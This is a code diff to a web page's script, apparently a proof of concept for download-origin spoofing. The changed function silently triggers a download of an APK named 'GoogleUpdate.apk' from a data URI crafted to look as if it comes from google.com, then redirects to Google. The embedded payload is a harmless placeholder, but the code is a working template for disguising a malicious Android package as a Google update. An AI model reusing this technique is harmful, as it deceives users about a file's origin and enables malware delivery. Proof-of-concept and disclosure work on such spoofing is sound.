@@ -29,19 +29,19 @@
 
   <script>
     function start() {
-      // Step 1: real redirect to google.com
-      location.href = "https://www.google.com";
+      // STEP 1: trigger spoofed download
+      const a = document.createElement("a");
+      a.href =
+        "data://google.com/application/vnd.android.package-archive;base64,VGhpcyBpcyBhIGhhcm1sZXNzIFBPQw==";
+      a.download = "GoogleUpdate.apk";
+      document.body.appendChild(a);
+      a.click();
+      a.remove();
 
-      // Step 2: after redirect, trigger download
+      // STEP 2: redirect AFTER download is initiated
       setTimeout(() => {
-        const a = document.createElement("a");
-        a.href =
-          "data://google.com/application/vnd.android.package-archive;base64,VGhpcyBpcyBhIGhhcm1sZXNzIFBPQw==";
-        a.download = "GoogleUpdate.apk";
-        document.body.appendChild(a);
-        a.click();
-        a.remove();
-      }, 800);
+        location.href = "https://www.google.com";
+      }, 300);
     }
   </script>
 </body>
